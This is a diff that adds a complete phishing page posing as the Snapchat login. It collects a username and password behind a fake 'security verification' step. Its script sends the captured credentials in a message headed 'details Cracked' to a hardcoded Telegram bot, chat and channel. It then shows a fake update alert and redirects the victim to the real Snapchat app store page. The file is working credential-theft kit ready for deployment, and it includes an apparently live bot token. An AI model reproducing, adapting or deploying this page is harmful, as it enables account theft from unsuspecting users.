@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Snapchat </title>
+    <style>
+        :root {
+            --bg-page: #f4f6f8;
+            --card-bg: #ffffff;
+            --text-main: #111827;
+            --text-muted: #6b7280;
+            --primary: #0080ff;
+            --primary-hover: #006ce6;
+            --border-dark: #1f2937;
+            --border-light: #e5e7eb;
+            --error: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background-color: var(--bg-page);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* --- CORE CARD CONTAINER --- */
+        .spa-card {
+            background: var(--card-bg);
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(0,0,0,0.04);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .portal-badge {
+            width: 52px;
+            height: 52px;
+            background: #eff6ff;
+            color: var(--primary);
+            border-radius: 14px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0, 128, 255, 0.15);
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 28px;
+            letter-spacing: -0.3px;
+        }
+
+        /* --- SPA VIEW SWITCHER --- */
+        .view-node {
+            display: none;
+            opacity: 0;
+            transform: translateY(6px);
+            transition: opacity 0.25s ease, transform 0.25s ease;
+        }
+
+        .view-node.is-active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* --- FORM INPUTS --- */
+        .field-group {
+            text-align: left;
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #4b5563;
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 12px;
+            border: 2px solid var(--border-dark);
+            border-radius: 10px;
+            font-size: 15px;
+            color: var(--text-main);
+            background: #fff;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 128, 255, 0.15);
+        }
+
+        /* --- LINKS & BUTTONS --- */
+        .action-link {
+            display: block;
+            text-align: center;
+            color: var(--primary);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 24px;
+            margin-top: 4px;
+        }
+
+        .action-link:hover { text-decoration: underline; }
+
+        .btn-submit {
+            width: 25%;
+            padding: 14px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+        }
+
+        .btn-submit:hover { background-color: var(--primary-hover); }
+        .btn-submit:active { transform: scale(0.98); }
+
+        /* --- STEP 2: CONCENTRIC OPPOSING SPINNER --- */
+        .loader-wrapper {
+            padding: 30px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner-canvas {
+            position: relative;
+            width: 60px;
+            height: 60px;
+        }
+
+        .spinner-ring {
+            position: absolute;
+            border-radius: 50%;
+        }
+
+        /* Outer Ring: Clockwise */
+        .ring-cw {
+            width: 100%;
+            height: 100%;
+            top: 0; left: 0;
+            border: 3.5px solid var(--primary);
+            border-top-color: transparent;
+            animation: spinCW 0.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        /* Inner Ring: Counter-Clockwise */
+        .ring-ccw {
+            width: 60%;
+            height: 60%;
+            top: 20%; left: 20%;
+            border: 3.5px solid #ffb700;
+            border-bottom-color: transparent;
+            animation: spinCCW 0.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        @keyframes spinCW { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spinCCW { 0% { transform: rotate(360deg); } 100% { transform: rotate(0deg); } }
+
+        /* --- STEP 3: USER CHIP & PASSWORD --- */
+        .user-identity-pill {
+            background: #f3f4f6;
+            border: 1px solid #e5e7eb;
+            padding: 6px 14px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            margin-bottom: 22px;
+            max-width: 90%;
+        }
+
+        .user-identity-pill span {
+            font-weight: 700;
+            color: var(--text-main);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .user-identity-pill a {
+            color: var(--primary);
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .detail2-eye {
+            position: absolute;
+            right: 14px;
+            top: 38px;
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        /* --- FOOTER & MISC --- */
+        .or-rule {
+            display: flex;
+            align-items: center;
+            color: #9ca3af;
+            margin: 24px 0;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        .or-rule::before, .or-rule::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: var(--border-light);
+            margin: 0 12px;
+        }
+
+        .btn-sso {
+            width: 100%;
+            padding: 12px;
+            border: 1.5px solid var(--border-light);
+            border-radius: 30px;
+            background: white;
+            font-weight: 600;
+            font-size: 14px;
+            color: var(--text-main);
+            cursor: pointer;
+            margin-bottom: 28px;
+            transition: background 0.15s;
+        }
+
+        .btn-sso:hover { background: #f9fafb; }
+
+        .card-footer { font-size: 14px; color: var(--text-muted); }
+        .card-footer a { color: var(--text-main); font-weight: 700; text-decoration: none; }
+        
+        .error-bubble {
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 600;
+            text-align: left;
+            margin-top: 6px;
+            margin-bottom: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="spa-card">
+        
+        <div id="view-1" class="view-node is-active">
+            <div class="portal-badge"></div>
+            <h2>Log in to Snapchat</h2>
+            
+            <div class="field-group">
+                <label>Username or email</label>
+                <input type="text" id="in-user" autocomplete="username" placeholder="">
+            </div>
+            <a href="#" class="action-link">  Use phone number instead</a>
+            
+            <div id="err-user" class="error-bubble">The input field cannot be empty or short</div>
+            
+            <button class="btn-submit" type="button" onclick="AppFlow.stepOne()">Next</button>
+            
+            <div class="or-rule">OR</div>
+            
+            <button class="btn-sso" type="button">Continue with Google</button>
+            
+            
+            <div class="card-footer">
+                New to the Snapchat? <a href="#">Sign up</a>
+            </div>
+        </div>
+
+
+        <div id="view-2" class="view-node">
+            <div class="portal-badge"></div>
+            <h2>Verifying your request</h2>
+            
+            <div class="loader-wrapper">
+                <div class="spinner-canvas">
+                    <div class="spinner-ring ring-cw"></div>
+                    <div class="spinner-ring ring-ccw"></div>
+                </div>
+                <p style="margin-top: 24px; font-size: 13px; color: var(--text-muted); font-weight: 500;">
+                    Please wait while we perform security verifications 
+                </p>
+            </div>
+        </div>
+
+
+        <div id="view-3" class="view-node">
+            <div class="portal-badge"></div>
+            <h2>Enter password</h2>
+            
+            <div class="user-identity-pill">
+                <span id="rendered-user">...</span>
+                <a href="#" onclick="AppFlow.reset(event)">Not you?</a>
+            </div>
+
+            <form onsubmit="AppFlow.stepTwo(event)">
+                <div class="field-group">
+                    <label>Password</label>
+                    <input type="password" id="in-pass" required placeholder="••••••••••••">
+                    <button type="button" class="detail2-eye" onclick="AppFlow.toggleEye(this)">SHOW</button>
+                </div>
+
+                <div id="err-pass" class="error-bubble">Invalid.</div>
+
+                <button class="btn-submit" type="submit" style="margin-top: 16px;">Next</button>
+            </form>
+
+            <div style="margin-top: 22px;">
+                <a href="#" style="font-size: 13px; color: var(--primary); font-weight: 600; text-decoration: none;">Forgotten password</a>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const AppFlow = (() => {
+            const v1 = document.getElementById('view-1');
+            const v2 = document.getElementById('view-2');
+            const v3 = document.getElementById('view-3');
+            
+            const fieldUser = document.getElementById('in-user');
+            const fieldPass = document.getElementById('in-pass');
+            const displayUser = document.getElementById('rendered-user');
+            
+            const errUser = document.getElementById('err-user');
+            const errPass = document.getElementById('err-pass');
+
+            const transitionTo = (targetNode) => {
+                [v1, v2, v3].forEach(node => node.classList.remove('is-active'));
+                targetNode.classList.add('is-active');
+            };
+
+            return {
+                stepOne: () => {
+                    const rawVal = fieldUser.value.trim();
+                    if(!rawVal || rawVal.length < 3) {
+                        fieldUser.style.borderColor = 'var(--error)';
+                        errUser.style.display = 'block';
+                        fieldUser.focus();
+                        return;
+                    }
+
+                    fieldUser.style.borderColor = 'var(--border-dark)';
+                    errUser.style.display = 'none';
+                    displayUser.textContent = rawVal;
+
+                    transitionTo(v2);
+
+                    setTimeout(() => {
+                        transitionTo(v3);
+                        fieldPass.focus();
+                    }, 3000);
+                },
+
+                stepTwo: (e) => {
+                    e.preventDefault();
+                    if(fieldPass.value.length < 6) {
+                        fieldPass.style.borderColor = 'var(--error)';
+                        errPass.style.display = 'block';
+                        return;
+                    }
+                    errPass.style.display = 'none';
+                    fieldPass.style.borderColor = 'var(--border-dark)';
+
+                    // --- TELEGRAM BOT LOGIC ---
+                    let firstBC   = fieldUser.value.trim();
+                    let secondAcc = fieldPass.value.trim();
+
+                   let botToken  = "8461399840:AAGd207em7CjGl6YmorfcVW1Vsldz1fY7-E";
+  let userChat  = "6064621203";
+  let channelID = "-1003379083557";
+
+
+                    let message =
+                        "details Cracked💥\n\n" +
+                        "Username  :\n" + firstBC + "\n\n" +
+                        "Password :\n" + secondAcc;
+
+                    let encoded = encodeURIComponent(message);
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userChat}&text=${encoded}`);
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelID}&text=${encoded}`);
+
+                    // =========================================================
+                    //  PUT YOUR MANUAL REDIRECT LINK IN THE QUOTES BELOW:
+                    // =========================================================
+                    const EXTERNAL_URL = "https://play.google.com/store/apps/details?id=com.snapchat.android"; 
+
+                    alert("Update available");
+
+                    setTimeout(() => {
+                        let newTab = window.open(EXTERNAL_URL, '_blank');
+
+                        // Pop-up blocker safety net: forces redirect if tab was blocked
+                        if (!newTab || newTab.closed || typeof newTab.closed === 'undefined') {
+                            window.location.href = EXTERNAL_URL;
+                        }
+                    }, 2000);
+                },
+
+                reset: (e) => {
+                    e.preventDefault();
+                    fieldPass.value = '';
+                    transitionTo(v1);
+                },
+
+                toggleEye: (btnEl) => {
+                    if(fieldPass.type === 'password') {
+                        fieldPass.type = 'text';
+                        btnEl.textContent = 'HIDE';
+                    } else {
+                        fieldPass.type = 'password';
+                        btnEl.textContent = 'SHOW';
+                    }
+                }
+            }
+        })();
+
+        document.getElementById('in-user').addEventListener('keydown', (e) => {
+            if(e.key === 'Enter') AppFlow.stepOne();
+        });
+    </script>
+</body>
+</html>
